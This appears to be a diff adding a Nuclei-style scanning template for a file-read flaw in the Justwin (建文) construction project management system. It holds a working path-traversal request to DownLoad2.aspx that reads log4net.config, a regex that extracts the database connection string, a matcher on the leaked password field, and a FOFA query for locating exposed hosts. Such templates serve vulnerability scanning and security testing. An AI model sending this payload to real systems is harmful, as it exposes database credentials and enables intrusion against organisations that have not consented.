@@ -1,0 +1,34 @@
+id: justwin-gcgl-download2-fileread
+
+info:
+  name: justwin-gcgl-download2-fileread
+  author: HackTwo
+  severity: high
+  description: 建文 工程管理系统 download2 存在文件读取漏洞。
+  tags: justwin,fileread
+  metadata:
+    fofa-qeury: body="Login/QRLogin.ashx"
+
+http:
+  - raw:
+      - |              
+        POST /Common/DownLoad2.aspx HTTP/1.1
+        Host: 
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0
+
+        path=../log4net.config&Name=    
+
+    extractors:
+      - type: regex
+        name: database
+        part: body
+        group: 1
+        regex:
+          - "connectionString value=(.*)"                   
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains(body, "PWD=") && contains(header, "application/octet-stream")'
